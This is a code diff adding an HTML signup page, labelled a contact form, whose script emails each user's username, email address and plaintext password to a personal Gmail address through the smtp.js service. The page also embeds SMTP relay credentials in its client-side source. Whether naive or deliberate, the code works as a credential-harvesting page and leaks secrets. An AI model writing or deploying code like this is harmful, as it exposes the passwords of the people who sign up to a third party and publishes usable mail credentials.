@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Contact Form</title>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div class="container">
+        <form id="contactForm" onsubmit="sendEmail(); return false;">
+            <label for="username">Username:</label>
+            <input type="text" id="username" name="username" placeholder="Enter your username" required>
+
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email" placeholder="Enter your Email" required>
+
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            <label for="password">Confirm Password:</label>
+            <input type="password" id="Confirmpassword" name="confirmpassword" placeholder="Enter your Confirm password"
+                required>
+            <button type="submit">Signup</button>
+            <div class="login-link">
+                <p>Already have an account? <a href="login.html">Login</a></p>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        function sendEmail() {
+            var name = document.getElementById('username').value;
+            var email = document.getElementById('email').value;
+            var message = document.getElementById('password').value;
+
+            Email.send({
+                Host: "smtp.elasticemail.com",
+                Username: "ofwar6163@gmail.com",
+                Password: "15345C8DC0B660A6B25865A49F1A97D3B172",
+                To: 'mahanandhan2002@gmail.com',
+                From: email,
+                Subject: "New Contact Form Submission",
+                Body: "Name: " + name + "<br>Email: " + email + "<br>Message: " + message
+            }).then(
+                function (message) {
+                    alert("Email sent successfully");
+
+                },
+                function (error) {
+                    console.error(error);
+                    alert("Failed to send email. Please try again later.");
+                }
+            );
+        }
+    </script>
+</body>
+
+</html>
